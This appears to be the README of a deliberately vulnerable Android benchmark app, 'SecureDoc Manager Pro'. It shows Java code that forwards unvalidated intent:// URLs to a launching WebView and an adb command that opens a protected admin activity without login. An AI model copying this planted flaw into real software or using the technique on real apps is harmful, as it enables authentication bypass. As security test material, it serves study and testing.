# oxo-android-ben63: Intent Scheme WebView Component Bypass

## Vulnerability Overview

SecureDoc Manager Pro demonstrates an Intent Scheme WebView vulnerability that allows bypassing Android's component export restrictions and authentication mechanisms. The vulnerability occurs when exported activities forward intent:// URLs to WebView components that process them without proper validation, enabling unauthorized access to protected app functionality.

## Attack Vector: Intent Scheme Parsing Bypass

**Brief Explanation**: The app's ShareActivity (exported for document sharing) forwards URLs to AuthWebViewActivity, which processes intent:// schemes and automatically launches the embedded components without validation.

**Key Characteristics**:
- Bypasses `android:exported="false"` component restrictions
- Circumvents authentication requirements
- Exploits legitimate document sharing functionality
- Enables access to administrative functions

**Vulnerable Code Pattern**:
```java
// ShareActivity - Exported for document sharing
if (Intent.ACTION_VIEW.equals(action)) {
    String url = viewIntent.getDataString();
    Intent webIntent = new Intent(this, AuthWebViewActivity.class);
    webIntent.putExtra("url", url);  // No URL validation
    startActivity(webIntent);
}

// AuthWebViewActivity - Processes intent schemes
String url = getIntent().getStringExtra("url");
if (url != null && url.startsWith("intent:")) {
    Intent intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME);
    startActivity(intent);  // VULNERABLE: No component validation
}
```

## Testing

### Manual Testing Steps

1. **Verify Normal Security Controls**:
   ```bash
   # Direct access should fail with SecurityException
   adb shell am start -n com.documentmanager.pro/.AdminPanelActivity
   ```

2. **Exploit Intent Scheme Bypass**:
   ```bash
   # Bypass via ShareActivity proxy
   adb shell 'am start -a android.intent.action.VIEW -d "intent:#Intent;component=com.documentmanager.pro/.AdminPanelActivity;end" com.documentmanager.pro/.ShareActivity'
   ```

3. **Verify Unauthorized Access**:
   - Admin Panel should open without login requirement
   - Full administrative functionality accessible
   - Authentication completely bypassed

**Expected Results**:
- Direct access fails with permission denial
- Proxy access succeeds, launching protected components
- Administrative functions accessible without credentials

**Difficulty**: Medium

## Impact Assessment

- **Confidentiality**: High - Unauthorized access to sensitive documents and admin functions
- **Integrity**: High - Administrative controls accessible without authentication  
- **Availability**: Low - No impact on service availability
- **OWASP Mobile Top 10**: M10 - Extraneous Functionality
- **CWE**: CWE-939 (Improper Authorization in Handler for Custom URL Scheme)

## App Features

**SecureDoc Manager Pro** - Professional document management application featuring:

- **Authentication System**: Login with session management
- **Document Management**: Browse, search, and upload documents  
- **Secure Viewer**: WebView-based document rendering with auth headers
- **Administrative Panel**: User management and system controls
- **Document Sharing**: External app integration via ShareActivity

The application demonstrates realistic enterprise document management functionality while containing the subtle intent scheme processing vulnerability.

## Build Instructions

```bash
cd SecureDocManagerPro
./gradlew assembleDebug
# APK output: app/build/outputs/apk/debug/app-debug.apk
```